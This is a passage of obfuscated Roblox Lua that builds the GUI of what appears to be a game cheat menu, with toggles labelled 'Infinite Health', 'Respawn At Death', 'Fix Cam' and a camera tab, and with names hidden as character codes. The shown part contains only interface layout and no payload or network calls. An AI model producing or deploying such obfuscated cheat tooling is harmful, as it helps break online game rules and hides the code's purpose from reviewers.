_llza[_sc(50,54,98)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,54,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,98)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,54,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,54,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54,99)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,54,98)]);
_llza[_sc(50,54,99)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,54,99)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,54,100)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,54,54)]);
_llza[_sc(50,54,100)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,54,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,54,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54,100)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,54,100)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,54,100)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,54,100)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(50,54,100)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,54,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,54,100)][_sc(84,101,120,116)]=[[Infinite Health]];
_llza[_sc(50,54,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,54,100)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,54,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,54,100)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,54,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,54,100)]);
_llza[_sc(50,54,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,54,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,54,100)]);
_llza[_sc(50,54,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,55,48)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,54,54)]);
_llza[_sc(50,55,48)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,55,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,50,98)]);
_llza[_sc(50,55,49)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,55,49)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,55,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,55,49)][_sc(78,97,109,101)]=[[RespawnAtDeath]];
_llza[_sc(50,55,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,55,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,55,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,55,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,55,50)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,55,49)]);
_llza[_sc(50,55,50)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,55,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,55,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,55,50)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,55,50)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,55,50)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,55,50)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,55,50)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,55,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,55,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,55,50)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,55,51)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,55,50)]);
_llza[_sc(50,55,51)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,55,51)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,55,51)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,55,51)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,55,52)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,55,50)]);
_llza[_sc(50,55,52)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,55,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,55,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,55,52)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(50,55,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,55,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,55,52)]);
_llza[_sc(50,55,53)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,55,53)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,55,54)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,55,52)]);
_llza[_sc(50,55,54)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,55,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,55,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,55,54)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(50,55,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,55,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,55,55)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,55,54)]);
_llza[_sc(50,55,55)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,55,55)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,55,56)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,55,49)]);
_llza[_sc(50,55,56)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,55,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,55,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,55,56)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,55,56)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,55,56)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,55,56)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(50,55,56)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,55,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,55,56)][_sc(84,101,120,116)]=[[Respawn At Death]];
_llza[_sc(50,55,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,55,56)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(50,55,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,55,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(50,55,57)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,55,56)]);
_llza[_sc(50,55,57)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(50,55,97)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,55,56)]);
_llza[_sc(50,55,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,55,98)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,55,49)]);
_llza[_sc(50,55,98)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(50,55,99)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,102,101)]);
_llza[_sc(50,55,99)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 129);
_llza[_sc(50,55,99)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,55,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,55,99)][_sc(78,97,109,101)]=[[cameraTab]];
_llza[_sc(50,55,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,55,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(50,55,100)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(50,55,99)]);
_llza[_sc(50,55,100)][_sc(78,97,109,101)]=_sc(99,97,109,101,114,97,83,99,114,105,112,116);
_llza[_sc(50,55,101)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(50,55,99)]);
_llza[_sc(50,55,101)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(50,55,101)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(50,55,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,55,99)]);
_llza[_sc(50,55,102)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,55,102)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(50,55,102)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(50,55,102)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(50,56,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,55,99)]);
_llza[_sc(50,56,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(50,56,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,48)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(50,56,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,56,48)]);
_llza[_sc(50,56,49)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(50,56,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,49)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(50,56,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(50,56,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(50,56,50)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(50,56,49)]);
_llza[_sc(50,56,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,55,99)]);
_llza[_sc(50,56,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,56,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(50,56,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,51)][_sc(78,97,109,101)]=[[======TITLE======]];
_llza[_sc(50,56,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,51)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,56,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,52)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,56,51)]);
_llza[_sc(50,56,52)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(50,56,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,56,52)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(50,56,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,56,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,56,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 15);
_llza[_sc(50,56,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,52)][_sc(84,101,120,116)]=[[Camera]];
_llza[_sc(50,56,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,56,52)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.02273, 0, 0, 0);
_llza[_sc(50,56,53)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,56,52)]);
_llza[_sc(50,56,53)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,56,54)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,56,52)]);
_llza[_sc(50,56,54)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 1);
_llza[_sc(50,56,55)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,56,51)]);
_llza[_sc(50,56,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,56,55)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=0.3;
_llza[_sc(50,56,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,56,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,55)][_sc(83,105,122,101)]=UDim2.new(0, 35, 1, 0);
_llza[_sc(50,56,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,55)][_sc(84,101,120,116)]=[[-]];
_llza[_sc(50,56,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -30, 0, 0);
_llza[_sc(50,56,55)][_sc(78,97,109,101)]=[[minimise]];
_llza[_sc(50,56,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,55,99)]);
_llza[_sc(50,56,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 23);
_llza[_sc(50,56,56)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,56,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,56)][_sc(78,97,109,101)]=[[FixCam]];
_llza[_sc(50,56,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,56)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,56,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,57)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,56,56)]);
_llza[_sc(50,56,57)][_sc(90,73,110,100,101,120)]=49;
_llza[_sc(50,56,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,57)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,56,57)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,57)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,56,57)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,56,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,57)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,57)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,56,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,56,57)]);
_llza[_sc(50,56,97)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(50,56,97)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(50,56,97)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,56,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,56,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,56,57)]);
_llza[_sc(50,56,98)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(50,56,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,56,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(50,56,98)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(50,56,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(50,56,99)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,56,98)]);
_llza[_sc(50,56,99)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(50,56,99)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(50,56,100)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(50,56,98)]);
_llza[_sc(50,56,100)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,56,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,100)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(50,56,100)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,101)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(50,56,100)]);
_llza[_sc(50,56,101)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(50,56,101)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(50,56,102)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(50,56,57)]);
_llza[_sc(50,56,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,56,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,102)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,56,102)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,102)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,56,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(50,56,102)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,56,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,56,102)][_sc(84,101,120,116)]=[[Fix Cam]];
_llza[_sc(50,56,102)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,56,102)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(50,56,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,57,48)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(50,56,102)]);
_llza[_sc(50,57,48)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(50,57,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,56,56)]);
_llza[_sc(50,57,49)][_sc(90,73,110,100,101,120)]=90;
_llza[_sc(50,57,49)][_sc(83,105,122,101)]=UDim2.new(0, 0, 1, 0);
_llza[_sc(50,57,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,49)][_sc(78,97,109,101)]=[[fillbar]];
_llza[_sc(50,57,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,57,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.95;
_llza[_sc(50,57,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57,50)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,55,99)]);
_llza[_sc(50,57,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(50,57,50)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(50,57,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,50)][_sc(78,97,109,101)]=[[MaxZoom]];
_llza[_sc(50,57,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,57,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,57,50)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(50,57,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57,51)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(50,57,50)]);
_llza[_sc(50,57,51)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(50,57,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(50,57,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(50,57,51)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(50,57,51)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,57,51)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(50,57,51)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,51)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(50,57,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(50,57,51)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(50,57,51)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(50,57,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(50,57,51)]);
_llza[_sc(50,57,52)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(50,57,52)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(50,57,52)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(50,57,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(50,57,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(50,57,51)]);
_llza[_sc(50,57,53)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
